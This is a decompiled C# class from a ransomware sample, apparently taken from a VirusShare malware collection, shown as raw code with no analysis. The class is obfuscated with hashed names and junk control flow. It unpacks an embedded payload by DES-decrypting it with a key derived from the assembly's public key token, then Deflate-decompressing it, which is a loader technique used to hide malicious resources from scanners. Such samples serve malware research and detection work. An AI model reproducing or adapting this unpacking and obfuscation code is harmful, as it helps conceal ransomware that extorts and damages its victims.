// Decompiled with JetBrains decompiler
// Type: A.cffee6917c5702749ad90267494b72ff3
// Assembly: 32, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C93294FB-B676-4110-BC34-1BBFDCE71D12
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.jxl-cf34983d94106bb4f3c93fee99c1143f1004afd825a0bd084bb37ed0f9a3ec74.exe

using System;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Security.Cryptography;

namespace A
{
  internal sealed class cffee6917c5702749ad90267494b72ff3
  {
    private static readonly object cbdf9030996967e76b76e22a3d21e548d;
    private static readonly int c95571e0da57c8ec18d7c53844bbf71d7;
    private static readonly int ca95ce6327050ebfdcfc59511d3b03fee;
    private static readonly MemoryStream cf415547530a07f627e465abc035e8844 = (MemoryStream) null;
    private static readonly MemoryStream c410a5bbc5b0e763b2f6b99df72baaab1 = (MemoryStream) null;

    static cffee6917c5702749ad90267494b72ff3()
    {
      cffee6917c5702749ad90267494b72ff3.c95571e0da57c8ec18d7c53844bbf71d7 = int.MaxValue;
      cffee6917c5702749ad90267494b72ff3.ca95ce6327050ebfdcfc59511d3b03fee = int.MinValue;
      cffee6917c5702749ad90267494b72ff3.cf415547530a07f627e465abc035e8844 = cc08895c77c3955aaa74bd15031d9c087.ce868b3f984fba724aa0079f155fef270(0);
      cffee6917c5702749ad90267494b72ff3.c410a5bbc5b0e763b2f6b99df72baaab1 = cc08895c77c3955aaa74bd15031d9c087.ce868b3f984fba724aa0079f155fef270(0);
      cffee6917c5702749ad90267494b72ff3.cbdf9030996967e76b76e22a3d21e548d = cb1fcbd9f55b495d519e3b7902201cae1.ce868b3f984fba724aa0079f155fef270();
    }

    private static string c727447ad8b6b96f29912ee6ef6702702(Assembly _param0)
    {
      string str = cae6779e1553d26ddcf9786811b2fb775.c63ce3d5d9dcc0957f517f8c54cb71435((object) _param0);
      int num = c23945d90e9bbe7bb201ed07554b10805.c63ce3d5d9dcc0957f517f8c54cb71435((object) str, ',');
      if (num >= 0)
      {
label_1:
        switch (2)
        {
          case 0:
            goto label_1;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (cffee6917c5702749ad90267494b72ff3.c727447ad8b6b96f29912ee6ef6702702);
            }
            str = c6cc56ceaf794516f1c5505370a07abe8.c63ce3d5d9dcc0957f517f8c54cb71435((object) str, 0, num);
            break;
        }
      }
      return str;
    }

    private static byte[] c348a72085515b6d226308d6d0fc696a1(Assembly _param0)
    {
      try
      {
        string str = cae6779e1553d26ddcf9786811b2fb775.c63ce3d5d9dcc0957f517f8c54cb71435((object) _param0);
        int num1 = cc7b93beda245e55206f85fa5136af668.c63ce3d5d9dcc0957f517f8c54cb71435((object) str, "PublicKeyToken=");
        if (num1 < 0)
        {
label_1:
          switch (6)
          {
            case 0:
              goto label_1;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (cffee6917c5702749ad90267494b72ff3.c348a72085515b6d226308d6d0fc696a1);
              }
              num1 = cc7b93beda245e55206f85fa5136af668.c63ce3d5d9dcc0957f517f8c54cb71435((object) str, "publickeytoken=");
              break;
          }
        }
        if (num1 < 0)
        {
label_6:
          switch (7)
          {
            case 0:
              goto label_6;
            default:
              return (byte[]) null;
          }
        }
        else
        {
          int num2 = num1 + 15;
          if (c8ac8bf7598c1c04011db7d994b3a3f1c.c63ce3d5d9dcc0957f517f8c54cb71435((object) str, num2) != 'n')
          {
label_9:
            switch (7)
            {
              case 0:
                goto label_9;
              default:
                if (c8ac8bf7598c1c04011db7d994b3a3f1c.c63ce3d5d9dcc0957f517f8c54cb71435((object) str, num2) == 'N')
                {
label_11:
                  switch (5)
                  {
                    case 0:
                      goto label_11;
                  }
                }
                else
                {
                  byte[] numArray = c8dae84c383c90c4526c04e99eeb0787b.ce868b3f984fba724aa0079f155fef270(c397062d273c87ff94425a68f0b1ddc05.ce868b3f984fba724aa0079f155fef270(c6cc56ceaf794516f1c5505370a07abe8.c63ce3d5d9dcc0957f517f8c54cb71435((object) str, num2, 16), NumberStyles.HexNumber));
                  ccf19f59489a177d6f36355e5885c712d.ce868b3f984fba724aa0079f155fef270((Array) numArray);
                  return numArray;
                }
                break;
            }
          }
          return (byte[]) null;
        }
      }
      catch
      {
      }
      return (byte[]) null;
    }

    internal static byte[] c46823ff16408c0b006547cccdcd625e1(int _param0, Stream _param1)
    {
      object cbdf9030996967e76b76e22a3d21e548d;
      c54069759f58df80a6522143eddc73e62.ce868b3f984fba724aa0079f155fef270(cbdf9030996967e76b76e22a3d21e548d = cffee6917c5702749ad90267494b72ff3.cbdf9030996967e76b76e22a3d21e548d);
      try
      {
        Stream stream = _param1;
        MemoryStream memoryStream = (MemoryStream) null;
        ushort num1 = ~(ushort) cfa68e4f38dffc03ba1f5a1a82df3a872.c63ce3d5d9dcc0957f517f8c54cb71435((object) _param1);
        for (int index = 1; index < 2; ++index)
          cfa68e4f38dffc03ba1f5a1a82df3a872.c63ce3d5d9dcc0957f517f8c54cb71435((object) _param1);
label_4:
        switch (3)
        {
          case 0:
            goto label_4;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (cffee6917c5702749ad90267494b72ff3.c46823ff16408c0b006547cccdcd625e1);
            }
            if (((int) num1 & 2) != 0)
            {
label_8:
              switch (2)
              {
                case 0:
                  goto label_8;
                default:
                  DESCryptoServiceProvider cryptoServiceProvider = c8b14f30732afd3f228444fb46582ee7f.ce868b3f984fba724aa0079f155fef270();
                  byte[] numArray1 = new byte[8];
                  c4579fa417b3f3ed72299b01f04017af2.c63ce3d5d9dcc0957f517f8c54cb71435((object) _param1, numArray1, 0, 8);
                  c8caa42b7e48ac76749946705b52929c2.c63ce3d5d9dcc0957f517f8c54cb71435((object) cryptoServiceProvider, numArray1);
                  byte[] numArray2 = new byte[8];
                  c4579fa417b3f3ed72299b01f04017af2.c63ce3d5d9dcc0957f517f8c54cb71435((object) _param1, numArray2, 0, 8);
                  bool flag = true;
                  foreach (byte num2 in numArray2)
                  {
                    if (num2 != (byte) 0)
                    {
label_11:
                      switch (2)
                      {
                        case 0:
                          goto label_11;
                        default:
                          flag = false;
                          goto label_16;
                      }
                    }
                  }
label_15:
                  switch (4)
                  {
                    case 0:
                      goto label_15;
                  }
label_16:
                  if (flag)
                  {
label_17:
                    switch (1)
                    {
                      case 0:
                        goto label_17;
                      default:
                        numArray2 = cffee6917c5702749ad90267494b72ff3.c348a72085515b6d226308d6d0fc696a1(ca07730a9af5c7ddb79658aabab6a2fd6.ce868b3f984fba724aa0079f155fef270());
                        break;
                    }
                  }
                  c15a341d5baf8ce943e0f20eee853ff26.c63ce3d5d9dcc0957f517f8c54cb71435((object) cryptoServiceProvider, numArray2);
                  if (cffee6917c5702749ad90267494b72ff3.cf415547530a07f627e465abc035e8844 == null)
                  {
label_20:
                    switch (6)
                    {
                      case 0:
                        goto label_20;
                      default:
                        if (cffee6917c5702749ad90267494b72ff3.c95571e0da57c8ec18d7c53844bbf71d7 == int.MaxValue)
                        {
label_22:
                          switch (6)
                          {
                            case 0:
                              goto label_22;
                            default:
                              c44bf535ce6f92e546dd02865898ccf96.c63ce3d5d9dcc0957f517f8c54cb71435((object) cffee6917c5702749ad90267494b72ff3.cf415547530a07f627e465abc035e8844, (int) cf8bb8482626c76b50d9d495d124fc45f.c63ce3d5d9dcc0957f517f8c54cb71435((object) _param1));
                              break;
                          }
                        }
                        else
                        {
                          c44bf535ce6f92e546dd02865898ccf96.c63ce3d5d9dcc0957f517f8c54cb71435((object) cffee6917c5702749ad90267494b72ff3.cf415547530a07f627e465abc035e8844, cffee6917c5702749ad90267494b72ff3.c95571e0da57c8ec18d7c53844bbf71d7);
                          break;
                        }
                        break;
                    }
                  }
                  c8793c851f99ab29acba94461b76df48d.c63ce3d5d9dcc0957f517f8c54cb71435((object) cffee6917c5702749ad90267494b72ff3.cf415547530a07f627e465abc035e8844, 0L);
                  ICryptoTransform cryptoTransform = c776cbbeeaf4d5599b1d23a25f4cc7714.c63ce3d5d9dcc0957f517f8c54cb71435((object) cryptoServiceProvider);
                  int num3 = c6b9dae8a84dc2418e58a7dbf80ffe11c.c63ce3d5d9dcc0957f517f8c54cb71435((object) cryptoTransform);
                  cb0ec35de0b972bbfb0dd7f2383036d56.c63ce3d5d9dcc0957f517f8c54cb71435((object) cryptoTransform);
                  byte[] numArray3 = new byte[cb0ec35de0b972bbfb0dd7f2383036d56.c63ce3d5d9dcc0957f517f8c54cb71435((object) cryptoTransform)];
                  byte[] numArray4 = new byte[c6b9dae8a84dc2418e58a7dbf80ffe11c.c63ce3d5d9dcc0957f517f8c54cb71435((object) cryptoTransform)];
                  int num4;
                  for (num4 = (int) c63dd90ef69f8910ea989e456000b1b28.c63ce3d5d9dcc0957f517f8c54cb71435((object) _param1); (long) (num4 + num3) < cf8bb8482626c76b50d9d495d124fc45f.c63ce3d5d9dcc0957f517f8c54cb71435((object) _param1); num4 += num3)
                  {
                    c4579fa417b3f3ed72299b01f04017af2.c63ce3d5d9dcc0957f517f8c54cb71435((object) _param1, numArray4, 0, num3);
                    int num5 = ca698199735dbd147fa02ac4a43dd8d7b.c63ce3d5d9dcc0957f517f8c54cb71435((object) cryptoTransform, numArray4, 0, num3, numArray3, 0);
                    cc99b2bf494a225dc9a79401f1fed8c62.c63ce3d5d9dcc0957f517f8c54cb71435((object) cffee6917c5702749ad90267494b72ff3.cf415547530a07f627e465abc035e8844, numArray3, 0, num5);
                  }
label_28:
                  switch (5)
                  {
                    case 0:
                      goto label_28;
                    default:
                      c4579fa417b3f3ed72299b01f04017af2.c63ce3d5d9dcc0957f517f8c54cb71435((object) _param1, numArray4, 0, (int) (cf8bb8482626c76b50d9d495d124fc45f.c63ce3d5d9dcc0957f517f8c54cb71435((object) _param1) - (long) num4));
                      byte[] numArray5 = ccae61f6fa3bad564c8b72cc96a54600e.c63ce3d5d9dcc0957f517f8c54cb71435((object) cryptoTransform, numArray4, 0, (int) (cf8bb8482626c76b50d9d495d124fc45f.c63ce3d5d9dcc0957f517f8c54cb71435((object) _param1) - (long) num4));
                      cc99b2bf494a225dc9a79401f1fed8c62.c63ce3d5d9dcc0957f517f8c54cb71435((object) cffee6917c5702749ad90267494b72ff3.cf415547530a07f627e465abc035e8844, numArray5, 0, numArray5.Length);
                      stream = (Stream) cffee6917c5702749ad90267494b72ff3.cf415547530a07f627e465abc035e8844;
                      c8793c851f99ab29acba94461b76df48d.c63ce3d5d9dcc0957f517f8c54cb71435((object) stream, 0L);
                      memoryStream = cffee6917c5702749ad90267494b72ff3.cf415547530a07f627e465abc035e8844;
                      break;
                  }
                  break;
              }
            }
            if (((int) num1 & 8) != 0)
            {
label_31:
              switch (3)
              {
                case 0:
                  goto label_31;
                default:
                  try
                  {
                    if (cffee6917c5702749ad90267494b72ff3.c410a5bbc5b0e763b2f6b99df72baaab1 == null)
                    {
label_33:
                      switch (3)
                      {
                        case 0:
                          goto label_33;
                        default:
                          if (cffee6917c5702749ad90267494b72ff3.ca95ce6327050ebfdcfc59511d3b03fee == int.MinValue)
                          {
label_35:
                            switch (1)
                            {
                              case 0:
                                goto label_35;
                              default:
                                c44bf535ce6f92e546dd02865898ccf96.c63ce3d5d9dcc0957f517f8c54cb71435((object) cffee6917c5702749ad90267494b72ff3.c410a5bbc5b0e763b2f6b99df72baaab1, (int) cf8bb8482626c76b50d9d495d124fc45f.c63ce3d5d9dcc0957f517f8c54cb71435((object) stream) * 2);
                                break;
                            }
                          }
                          else
                          {
                            c44bf535ce6f92e546dd02865898ccf96.c63ce3d5d9dcc0957f517f8c54cb71435((object) cffee6917c5702749ad90267494b72ff3.c410a5bbc5b0e763b2f6b99df72baaab1, cffee6917c5702749ad90267494b72ff3.ca95ce6327050ebfdcfc59511d3b03fee);
                            break;
                          }
                          break;
                      }
                    }
                    c8793c851f99ab29acba94461b76df48d.c63ce3d5d9dcc0957f517f8c54cb71435((object) cffee6917c5702749ad90267494b72ff3.c410a5bbc5b0e763b2f6b99df72baaab1, 0L);
                    DeflateStream deflateStream = cd155d491fd3f49b4fbc6c0bb981a5366.ce868b3f984fba724aa0079f155fef270(stream, CompressionMode.Decompress);
                    int length = 1000;
                    byte[] numArray = new byte[length];
                    int num6;
                    do
                    {
                      num6 = c4579fa417b3f3ed72299b01f04017af2.c63ce3d5d9dcc0957f517f8c54cb71435((object) deflateStream, numArray, 0, length);
                      if (num6 > 0)
                      {
label_40:
                        switch (1)
                        {
                          case 0:
                            goto label_40;
                          default:
                            cc99b2bf494a225dc9a79401f1fed8c62.c63ce3d5d9dcc0957f517f8c54cb71435((object) cffee6917c5702749ad90267494b72ff3.c410a5bbc5b0e763b2f6b99df72baaab1, numArray, 0, num6);
                            break;
                        }
                      }
                    }
                    while (num6 >= length);
label_43:
                    switch (2)
                    {
                      case 0:
                        goto label_43;
                      default:
                        memoryStream = cffee6917c5702749ad90267494b72ff3.c410a5bbc5b0e763b2f6b99df72baaab1;
                        break;
                    }
                  }
                  catch (Exception ex)
                  {
                    break;
                  }
                  break;
              }
            }
            if (memoryStream != null)
            {
label_47:
              switch (1)
              {
                case 0:
                  goto label_47;
                default:
                  return c763712a1c0a0f3038a803e3ec2030eed.c63ce3d5d9dcc0957f517f8c54cb71435((object) memoryStream);
              }
            }
            else
            {
              byte[] numArray = new byte[cf8bb8482626c76b50d9d495d124fc45f.c63ce3d5d9dcc0957f517f8c54cb71435((object) _param1) - c63dd90ef69f8910ea989e456000b1b28.c63ce3d5d9dcc0957f517f8c54cb71435((object) _param1)];
              c4579fa417b3f3ed72299b01f04017af2.c63ce3d5d9dcc0957f517f8c54cb71435((object) _param1, numArray, 0, numArray.Length);
              return numArray;
            }
        }
      }
      finally
      {
        cd42b6f3dfd3ce0d1d0c549fe1fc4c564.ce868b3f984fba724aa0079f155fef270(cbdf9030996967e76b76e22a3d21e548d);
      }
    }
  }
}
